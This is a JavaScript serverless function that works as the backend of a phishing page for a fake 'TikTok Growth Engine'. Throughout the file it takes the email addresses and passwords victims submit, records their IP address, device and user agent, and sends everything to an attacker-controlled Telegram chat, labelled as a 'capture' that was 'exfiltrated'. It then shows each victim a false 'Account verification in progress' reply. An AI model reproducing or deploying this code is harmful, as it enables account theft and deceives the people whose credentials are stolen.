exports.handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 204, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    console.error('Missing Telegram credentials');
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ success: true, message: 'Processing...' })
    };
  }

  try {
    const data = JSON.parse(event.body);
    const { email, password, timestamp, userAgent } = data;

    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                     event.headers['x-nf-client-connection-ip'] ||
                     'unknown';

    const ua = userAgent || 'Unknown';
    const isMobile = /Mobile|Android|iPhone/i.test(ua);
    const device = isMobile ? '📱 Mobile' : '💻 Desktop';

    const time = timestamp
      ? new Date(timestamp).toLocaleString('en-US', {
          weekday: 'short',
          year: 'numeric',
          month: 'short',
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          timeZoneName: 'short'
        })
      : 'Unknown';

    const message = `
🎯 *NEW CAPTURE — TikTok Growth Engine*

👤 *Credentials*
├ Email: \`${email}\`
└ Password: \`${password}\`

🌐 *Target Info*
├ IP: \`${clientIP}\`
├ Device: ${device}
└ Time: ${time}

🔍 *User Agent*
\`${ua.substring(0, 300)}${ua.length > 300 ? '...' : ''}\`

📊 *Status:* ✅ Captured & Logged
    `.trim();

    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const telegramPayload = {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    };

    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(telegramPayload)
    });

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error('Telegram error:', errorText);
    } else {
      console.log('✅ Exfiltrated to Telegram');
    }

    console.log('=== BACKUP LOG ===');
    console.log(`Email: ${email}`);
    console.log(`IP: ${clientIP}`);
    console.log(`Time: ${time}`);
    console.log('==================');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Account verification in progress...'
      })
    };

  } catch (err) {
    console.error('Capture error:', err);
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Account verification in progress...'
      })
    };
  }
};
